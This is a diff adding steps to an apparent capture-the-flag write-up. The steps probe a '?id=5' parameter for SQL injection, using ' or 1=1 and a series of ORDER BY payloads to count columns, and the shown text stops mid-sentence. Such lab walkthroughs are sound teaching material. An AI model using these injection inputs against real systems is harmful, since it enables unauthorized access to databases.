@@ -57,6 +57,8 @@ Please connect to our network before deploying the machine.</p>
 
 <br>
 
+<p>We have here an</p>
+
 ![image](https://github.com/user-attachments/assets/e334d7ce-26a2-4eca-9141-f1ea031600e7)
 
 <br>
@@ -69,11 +71,49 @@ Please connect to our network before deploying the machine.</p>
 
 <br>
 
-<p>Dennis is mentinoned in <code>?id=5</code></p>
+<p>Dennis is mentinoned in <code>?id=5</code>.  Maybe it is a username?!</p>
 
 ![image](https://github.com/user-attachments/assets/8c346ec3-ce19-484a-9635-ee398e48dc4f)
 
 <br>
+
+<p>Let´s try <code>’ or 1=1</code>.</p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/0817fa73-100f-477a-a75b-39894433fb0f)
+
+<br>
+
+<p>Scrolling down ... </p>
+
+<br>
+
+
+![image](https://github.com/user-attachments/assets/a5cd1bf1-d168-46ca-afdb-6a515b64988f)
+
+<br>
+
+<p>So it is about <code>SQL Injection</code>!</p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/4a029447-c6b2-46ae-8fa6-8e31bb09ca2c)
+
+<br>
+
+<p><code>' or 1=1 ORDER BY 1,2</code> did not work.<br>
+<code>' or 1=1 ORDER BY 1,2,3</code> did not work.<br>
+<code>' or 1=1 ORDER BY 1,2,3,4</code> did not work.<br><br>
+<code>' or 1=1 ORDER BY 1,2,3,4,5</code> did not work.<br><br>
+But guess what?  .... with <code>' or 1=1 ORDER BY 1,2,3,4,5,6</code> the output wass ...</p>
+
+
+
+
+
+
+
 
 
 
